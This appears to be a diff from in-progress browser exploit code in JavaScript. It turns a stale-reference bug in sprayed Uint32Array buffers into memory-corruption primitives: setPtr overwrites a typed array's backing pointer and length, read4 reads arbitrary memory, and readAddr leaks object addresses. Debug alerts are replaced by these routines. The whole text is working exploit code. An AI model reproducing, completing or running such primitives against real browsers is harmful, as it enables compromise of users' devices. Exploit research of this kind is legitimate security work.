@@ -111,31 +111,56 @@ function doItAll() {
 	}*/
 
 	var temp = new Uint32Array(0x10);
+	temp[0] = 0x41414141;
 	stale[1] = temp;
 
 	log('Looking for buf...');
 
 	function dumpbuf(count) {
 		for(var j = 0; j < count; ++j)
-			log('Buf[' + j + '] == ' + bufs[i][j]);
+			log('Buf[' + j + '] == 0x' + bufs[i][j].toString(16));
 	}
 
 	for(var i = 0; i < bufs.length; ++i) {
 		if(bufs[i][0] != 0x41424344) {
-			alert('!');
-			log('Changed value! ' + bufs[i][0]);
-			alert('...');
-			log('Length ' + bufs[i].length);
-			alert('!');
+			function setStale(obj) {
+				stale[1] = obj;
+			}
+
+			function setPtr(lo, hi, len) {
+				setStale(temp);
+				bufs[i][4] = lo;
+				bufs[i][5] = hi;
+				bufs[i][6] = len;
+			}
+
+			function read4(lo, hi) {
+				setPtr(lo, hi, 1);
+				return temp[0];
+			}
+
+			function readAddr(obj) {
+				setStale(obj);
+				log('Obj memory:');
+				dumpbuf(16);
+				var addr = [bufs[i][4], bufs[i][5]];
+				setStale(temp);
+				log('Prev 0x' + addr[0].toString(16));
+				log('Now 0x' + bufs[i][4].toString(16));
+
+				return addr;
+			}
+
+			log('temp memory:');
 			dumpbuf(16);
-			log('Setting length...');
-			bufs[i][6] = 0x40;
-			log('Set...');
+			var addr = readAddr(tu);
+			//log(read4(addr[0], addr[1]).toString(16));
+			bufs[i][6] = 27;
+			log('temp memory:');
+			dumpbuf(16);
 			log(temp.length);
-			alert('?');
-		} else if(bufs[i].length != tu.length) {
-			alert('?');
-			log('Length changed but not value.  ' + bufs[i].length);
+			log(tu.length);
+			break;
 		}
 	}
 
